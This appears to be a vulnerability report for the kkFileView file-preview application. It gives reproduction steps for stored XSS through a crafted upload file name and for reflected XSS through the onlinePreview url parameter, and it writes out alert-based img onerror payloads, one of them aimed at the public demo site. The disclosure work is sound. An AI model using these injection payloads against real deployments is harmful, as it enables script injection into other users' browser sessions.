# Description

`kkFileView` this package is vulnerable to `Stored Cross-Site Scripting (XSS)`.

https://github.com/kekingcn/kkFileView

# Steps To Reproduce-:  (stored XSS)

1) install https://github.com/kekingcn/kkFileView locally or https://file.keking.cn/index use demo
2) while uploading files for preview use js code in file name paylload used ("><img src=x onerror=alert(222) ~2F>.xml)

# POC
  [gdrive](https://drive.google.com/file/d/1VqfAgldmtY-qrgHRfizVvAH2oIFZVT-q/view?usp=sharing)
![poc](https://user-images.githubusercontent.com/36979660/101929468-e386ed00-3bfc-11eb-89bc-d19017136e39.png)

# Steps To Reproduce-:  (reflected XSS)

1) install https://github.com/kekingcn/kkFileView locally or https://file.keking.cn/index use demo
2) use https://file.keking.cn/onlinePreview?url=f%22%3E%3Cimg%20src=x%20onerror=alert(222)%20~2F%3E 

# POC
![poc2](https://user-images.githubusercontent.com/36979660/101931207-1fbb4d00-3bff-11eb-97be-f3aecaaaff10.png)
